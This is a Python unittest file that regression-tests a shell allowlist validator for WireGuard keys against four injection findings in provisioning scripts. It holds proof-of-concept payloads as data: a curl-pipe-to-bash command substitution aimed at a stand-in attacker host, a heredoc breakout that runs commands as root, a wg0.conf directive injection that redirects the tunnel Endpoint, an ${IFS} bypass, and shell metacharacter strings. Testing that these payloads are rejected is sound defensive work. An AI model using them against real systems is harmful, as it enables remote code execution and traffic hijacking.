"""The WireGuard key/PSK allowlist and its four injection sinks.

Consolidates VULN-001/002/004/033 — one validator (`vh_is_wg_key`), four places a
node-authored value crosses into a privileged execution context, each a separate
finding but the same control:

  VULN-001  scripts/provision.sh interpolates HZ_PUB into a string `gcloud … --command`
            runs as a root shell on the GCP hub (Hetzner side).
  VULN-002  aws/scripts/wg-mesh-join.sh does the same with AWS_PUB read over SSM.
  VULN-004  wg-mesh-join.sh interpolates HUB_PUB into a REMOTE heredoc the AWS box runs
            as root via `base64 -d | bash`; a newline+`CONF` closes the heredoc.
  VULN-033  provision.sh interpolates HUB_PUB/WG_PSK into the unquoted wg0.conf heredoc;
            a newline turns one value into extra WireGuard directives.

The validator behaviour is driven once against the union of every finding's PoC; the
per-sink wiring is checked by locating each sink and asserting the guard precedes it
(a flexible regex, so reformatting doesn't matter — only that the check is still there
and still ahead of the sink).
"""

import subprocess
import unittest
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parents[1]
GUARDS = REPO_ROOT / "scripts" / "lib" / "provision-guards.sh"
PROVISION = REPO_ROOT / "scripts" / "provision.sh"
JOIN = REPO_ROOT / "aws" / "scripts" / "wg-mesh-join.sh"

VALID_KEY = "kOtkkR2VfEHFN0m3ES0BJ0BpKbXPQ8YvvKZ5RRSXSHQ="

# The command-substitution PoC (VULN-004) needs no newline: the REMOTE heredoc is
# unquoted, so $( ) expands when the box runs the decoded script as root.
COMMAND_SUBSTITUTION = "AAAA$(curl${IFS}http://attacker.example/x|bash)BBBB="
# The heredoc-breakout PoC (VULN-004): closes the inner CONF heredoc, root-exec follows.
HEREDOC_BREAKOUT = VALID_KEY + "\nCONF\ntouch /tmp/spoke_pwned\ncat > /dev/null <<CONF"
# The wg0.conf directive-injection PoC (VULN-033).
DIRECTIVE_INJECTION = VALID_KEY + "\nAllowedIPs = 0.0.0.0/0\nEndpoint = attacker.example:51820"
# The ${IFS} payload (VULN-002) that survives the old `tr -d '[:space:]'` unchanged.
IFS_BYPASS = "x;touch${IFS}/tmp/pwned;#"

# Every metacharacter / injection shape any of the four findings named.
INJECTIONS = [
    "x; touch /tmp/pwned #", "x && id", "x`id`", "x$(id)", "x | id", "x\nid",
    "x'; id; '", '"; id; "', "../../etc/passwd", "",
    VALID_KEY + ";id", VALID_KEY + "\n", "\n" + VALID_KEY, VALID_KEY + "\r\nCONF",
    COMMAND_SUBSTITUTION, HEREDOC_BREAKOUT, DIRECTIVE_INJECTION, IFS_BYPASS,
]


def run_validator(fn: str, value: str) -> int:
    script = f'. "{GUARDS}"\n{fn} "$1"\n'
    return subprocess.run(["bash", "-c", script, "_", value],
                          capture_output=True, text=True).returncode


def accepts(value: str) -> bool:
    return run_validator("vh_is_wg_key", value) == 0


def after_tr(value: str) -> str:
    """What the removed `tr -d '[:space:]'` sanitiser would have produced."""
    return subprocess.run(["bash", "-c", 'printf "%s" "$1" | tr -d "[:space:]"', "_", value],
                          capture_output=True, text=True).stdout


def uncommented(lines):
    """Source lines with comment-only lines dropped, so a commented-out guard can't
    satisfy a wiring assertion while the vulnerability is live again."""
    return "\n".join(l for l in lines if not l.lstrip().startswith("#"))


class KeyAllowlistTest(unittest.TestCase):
    """The validator itself — driven against every finding's PoC at once."""

    def test_accepts_a_genuine_key(self):
        self.assertTrue(accepts(VALID_KEY),
                        "a real 32-byte base64 WireGuard key must be accepted")

    def test_rejects_every_injection_payload(self):
        for p in INJECTIONS:
            with self.subTest(payload=repr(p)):
                self.assertFalse(accepts(p),
                                 f"validator accepted {p!r}: it reaches a privileged sink")

    def test_ifs_bypass_survives_the_old_tr_but_the_validator_rejects_it(self):
        """The ${IFS} payload passed the removed tr sanitiser unchanged (VULN-002)."""
        self.assertEqual(after_tr(IFS_BYPASS), IFS_BYPASS,
                         "precondition: this payload passes the old tr sanitiser unchanged")
        self.assertFalse(accepts(IFS_BYPASS))

    def test_mesh_ip_allowlist(self):
        self.assertEqual(run_validator("vh_is_mesh_ip", "10.99.0.2"), 0)
        for bad in ["10.99.0.2; id", "10.99.0.0", "10.99.0.255", "192.168.1.1", "10.99.0.999"]:
            with self.subTest(bad=bad):
                self.assertNotEqual(run_validator("vh_is_mesh_ip", bad), 0)


class SinkWiringTest(unittest.TestCase):
    """Each node-authored value is allowlisted before it reaches its privileged sink."""

    def _preceding(self, path: Path, sink_pred):
        lines = path.read_text().splitlines()
        try:
            sink = next(i for i, l in enumerate(lines) if sink_pred(l))
        except StopIteration:
            self.fail(f"could not locate the sink in {path.name}")
        return uncommented(lines[:sink])

    def test_vuln033_provision_validates_hub_pub_and_psk_before_wg0conf(self):
        pre = self._preceding(PROVISION, lambda l: "PublicKey = ${HUB_PUB}" in l)
        self.assertRegex(pre, r"vh_require\s+vh_is_wg_key.*HUB_PUB",
                         "HUB_PUB reaches the wg0.conf heredoc without an allowlist check")
        self.assertRegex(pre, r"vh_require\s+vh_is_wg_key.*WG_PSK",
                         "WG_PSK reaches the wg0.conf heredoc without an allowlist check")

    def test_vuln004_join_validates_hub_pub_and_psk_before_remote_heredoc(self):
        pre = self._preceding(JOIN, lambda l: "PublicKey = ${HUB_PUB}" in l)
        self.assertRegex(pre, r"vh_require\s+vh_is_wg_key.*HUB_PUB",
                         "HUB_PUB reaches the root-executed remote script unchecked")
        self.assertRegex(pre, r"vh_require\s+vh_is_wg_key.*WG_PSK",
                         "WG_PSK reaches SSM Parameter Store unchecked")

    def test_vuln001_provision_validates_hz_pub_before_the_hub_call(self):
        pre = self._preceding(PROVISION,
                              lambda l: "wg-register-peer.sh" in l and "HZ_PUB" in l)
        self.assertRegex(pre, r"vh_require\s+vh_is_wg_key.*HZ_PUB",
                         "HZ_PUB reaches the hub command string without an allowlist check")

    def test_vuln002_join_sources_guards_and_validates_aws_pub_before_the_hub_call(self):
        pre = self._preceding(JOIN,
                              lambda l: "wg-register-peer.sh" in l and "AWS_PUB" in l)
        self.assertIn("provision-guards.sh", pre,
                      "wg-mesh-join.sh must source the shared guard library")
        self.assertRegex(pre, r"vh_require\s+vh_is_wg_key.*AWS_PUB",
                         "AWS_PUB reaches the hub command string without an allowlist check")


if __name__ == "__main__":
    unittest.main()
